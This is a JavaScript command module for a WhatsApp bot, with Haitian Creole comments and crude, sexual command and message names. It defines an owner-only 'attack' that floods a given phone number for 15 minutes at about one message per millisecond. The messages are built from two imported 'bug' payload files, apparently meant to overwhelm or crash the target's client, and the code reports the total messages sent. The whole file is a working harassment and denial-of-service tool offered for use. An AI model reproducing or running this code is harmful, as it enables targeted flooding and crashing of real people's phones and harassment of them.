const { cmd } = require('../command');
const config = require('../config');
const bugchat1 = require('../bug/izuka5.js'); // ✅ Pa retire
const bugchat2 = require('../bug/izuka3.js'); // ✅ Nouvo ajoute

cmd({
  pattern: '𝐑𝐄𝐘-big-dick',
  desc: 'Atak 0.001s sou 15 minit soti nan izuka3 + izuka5',
  category: 'bug',
  react: '🔞',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX || '.';
    const botNumber = await bot.decodeJid(bot.user.id);
    const senderId = m.sender;
    const allowedUsers = [
      botNumber,
      config.OWNER_NUMBER + '@s.whatsapp.net',
      ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')
    ];
    const protectedNumbers = ['18493740033']; // ✅ Pwoteksyon

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== '𝐫𝐞𝐲-big-dick') return;

    if (!allowedUsers.includes(senderId)) {
      return await bot.sendMessage(from, {
        text: '*🚫 Sa se pou Owner sèlman.*'
      }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    let targetNumber;

    if (m.isGroup) {
      targetNumber = senderId.split('@')[0];
    } else if (args.length > 0 && !isNaN(args[0])) {
      targetNumber = args[0];
    }

    if (!targetNumber) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}𝐑𝐄𝐘-big-dick <number>`
      }, { quoted: mek });
    }

    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ Nimewo sa a pwoteje, li pap resevwa atak.'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;

    await bot.sendMessage(from, {
      text: `🔞 *𝐑𝐄𝐘-big-dick ATACK LA LANCE*\n🎯 Target: +${targetNumber}\n⏳ Duration: 15 minit\n⚡ Speed: 0.001s/msg\n📂 Payloads: izuka3.js & izuka5.js`
    }, { quoted: mek });

    // Konbine tout line ki soti nan izuka3 ak izuka5
    const lines = [...bugchat1.split('\n'), ...bugchat2.split('\n')].filter(Boolean);
    const startTime = Date.now();
    let count = 0;

    while (Date.now() - startTime < 15 * 60 * 1000) {
      for (let line of lines) {
        await bot.sendMessage(targetJid, {
          text: `🔞 𝐑𝐄𝐘 BIG DICK #${++count}\n${line}\n\n🧠 *CRACK MODE ON*`
        });
        await new Promise(resolve => setTimeout(resolve, 1)); // ✅ 0.001s
      }
    }

    await bot.sendMessage(targetJid, {
      text: `✅ *𝐑𝐄𝐘 ATACK FINI*\n📤 Total: ${count} mesaj\n~IZUKA-MD~`
    });

    await bot.sendMessage(from, {
      text: `✅ *MISSION COMPLETE*\n🕒 15 minit\n📨 Total voye: ${count}\n🎯 Target: +${targetNumber}`
    }, { quoted: mek });

  } catch (error) {
    console.error(error);
    reply(`❌ Error: ${error.message}`);
  }
});
